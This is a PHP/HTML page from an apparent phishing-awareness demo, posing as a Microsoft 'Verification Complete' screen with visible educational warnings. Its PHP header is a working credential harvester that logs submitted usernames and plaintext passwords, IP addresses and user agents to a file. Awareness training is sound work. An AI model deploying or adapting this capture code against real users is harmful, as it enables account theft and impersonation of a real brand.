<?php
date_default_timezone_set("Asia/Jakarta");
$user = $_POST['username'];
$pass = $_POST['password'];
$time = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$data = "[$time] IP: $ip | Username: $user | Password: $pass | User-Agent: $user_agent\n";
file_put_contents("log.txt", $data, FILE_APPEND);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing - Microsoft</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Educational Warning -->
    <div class="edu-warning">
        🚨 EDUCATIONAL SIMULATION - In real phishing, your credentials would be stolen! 🚨
    </div>

    <div class="container processing-container">
        <div class="checkmark">✓</div>
        
        <h2>Verification Complete</h2>
        <p class="processing-text">Thank you for verifying your account.</p>
        <p class="processing-subtext">Your account security has been updated successfully.</p>
        
        <div class="security-info" style="margin-top: 24px;">
            <span class="warning-icon">🛡️</span>
            <strong>Educational Note:</strong> In a real phishing attack, your login credentials would now be in the hands of cybercriminals. Always verify URLs and look for security indicators before entering sensitive information.
        </div>

        <div style="margin-top: 24px;">
            <a href="phishing_email.html" class="sign-in-link">← Back to Email</a>
        </div>
    </div>

    <script>
        // Educational alert for demonstration
        setTimeout(function() {
            alert('🚨 EDUCATIONAL DEMO COMPLETE 🚨\n\nThis demonstrates how phishing works:\n\n1. Fake urgent email creates panic\n2. Convincing login page steals credentials\n3. Victim thinks they\'re "verified"\n4. Criminals now have their login details\n\nAlways check URLs and verify authenticity!');
        }, 2000);
    </script>
</body>
</html>